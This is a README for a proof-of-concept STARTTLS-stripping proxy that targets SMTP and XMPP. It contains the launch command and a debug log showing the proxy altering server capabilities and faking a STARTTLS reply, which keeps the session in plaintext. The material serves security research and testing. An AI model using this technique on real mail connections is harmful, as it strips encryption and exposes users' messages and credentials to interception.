# striptls - proxy

poc implementation of STARTTLS stripping attacks

* SMTP
 * server response capability patch
 * client STARTTLS stripping, invalid response code
 
* XMPP

## example: SMTP

proxy listening on localhost 8825, forwarding data to localhost 25 smtp server

	#> striptls.py localhost 8825 localhost 25
	2016-01-29 21:19:16,654 - INFO     - <Proxy 0x1ef0a50 listen=('localhost', 8825) target=('localhost', 25)> ready.
	2016-01-29 21:19:20,289 - INFO     - <Session 0x1ef0af0> client ('127.0.0.1', 10356) has connected
	2016-01-29 21:19:20,289 - INFO     - <Session 0x1ef0af0> connecting to target ('localhost', 25)
	2016-01-29 21:19:20,305 - DEBUG    - <Session 0x1ef0af0> [client] <= [server]          '220 OSHIBAMA ESMTP\r\n'
	2016-01-29 21:19:21,230 - DEBUG    - <Session 0x1ef0af0> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-29 21:19:21,247 - DEBUG    - <Session 0x1ef0af0> [client] <= [server]          '250-OSHIBAMA\r\n250-SIZE 20480000\r\n250-AUTH LOGIN\r\n250 HELP\r\n'
	2016-01-29 21:19:21,249 - DEBUG    - <Session 0x1ef0af0> [client] <= [server][mangled] '250-OSHIBAMA\r\n250-SIZE 20480000\r\n250-AUTH LOGIN\r\n250-STARTTLS\r\n250 HELP\r\n'
	2016-01-29 21:19:21,257 - DEBUG    - <Session 0x1ef0af0> [client] => [server]          'STARTTLS\r\n'
	2016-01-29 21:19:21,257 - DEBUG    - <Session 0x1ef0af0> [client] <= [server][mangled] '200 STRIPTLS\r\n'
	2016-01-29 21:19:21,259 - DEBUG    - <Session 0x1ef0af0> [client] => [server][mangled] None
	2016-01-29 21:19:21,259 - DEBUG    - <Session 0x1ef0af0> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
	2016-01-29 21:19:21,273 - DEBUG    - <Session 0x1ef0af0> [client] <= [server]          '250 OK\r\n'
	2016-01-29 21:19:21,276 - DEBUG    - <Session 0x1ef0af0> [client] => [server]          'rcpt TO:<b@a.com>\r\n'
	2016-01-29 21:19:21,289 - DEBUG    - <Session 0x1ef0af0> [client] <= [server]          '530 SMTP authentication is required.\r\n'
	2016-01-29 21:19:21,292 - DEBUG    - <Session 0x1ef0af0> [client] => [server]          'rset\r\n'
	2016-01-29 21:19:21,305 - DEBUG    - <Session 0x1ef0af0> [client] <= [server]          '250 OK\r\n'
	2016-01-29 21:19:21,316 - WARNING  - <Session 0x1ef0af0> terminated.
